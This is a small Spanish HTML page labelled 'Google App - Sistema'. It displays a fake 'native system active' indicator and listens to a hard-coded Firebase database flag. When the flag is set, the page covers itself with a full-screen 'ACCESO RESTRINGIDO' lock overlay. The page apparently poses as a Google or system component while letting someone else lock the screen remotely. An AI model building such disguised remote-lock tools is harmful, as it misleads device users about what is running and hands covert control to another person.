<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google App - Sistema</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { 
            background: black; 
            color: white; 
            font-family: sans-serif; 
            margin: 0; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            overflow: hidden; 
        }
        /* Pantalla de bloqueo */
        #bloqueo { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: black; 
            z-index: 9999; 
            justify-content: center; 
            align-items: center; 
            flex-direction: column; 
        }
        .warning { 
            color: red; 
            font-size: 28px; 
            font-weight: bold; 
            text-align: center;
        }
        /* Punto de estado */
        .status-dot {
            width: 15px; 
            height: 15px; 
            background: #0f0; 
            border-radius: 50%; 
            box-shadow: 0 0 10px #0f0;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div id="bloqueo">
        <span class="warning">⚠️ ACCESO RESTRINGIDO</span>
    </div>

    <div style="text-align:center;">
        <div class="status-dot"></div>
        <p style="color:#333; font-size:12px;">SISTEMA NATIVO ACTIVO</p>
    </div>

    <script>
        // Tu configuración de Firebase
        const firebaseConfig = {
            databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Escuchar cambios en tiempo real
        db.ref('bloqueo').on('value', (snap) => {
            const estado = snap.val();
            const capaBloqueo = document.getElementById('bloqueo');
            
            if (estado === "SI") {
                capaBloqueo.style.display = "flex";
            } else {
                capaBloqueo.style.display = "none";
            }
        });
    </script>
</body>
</html>
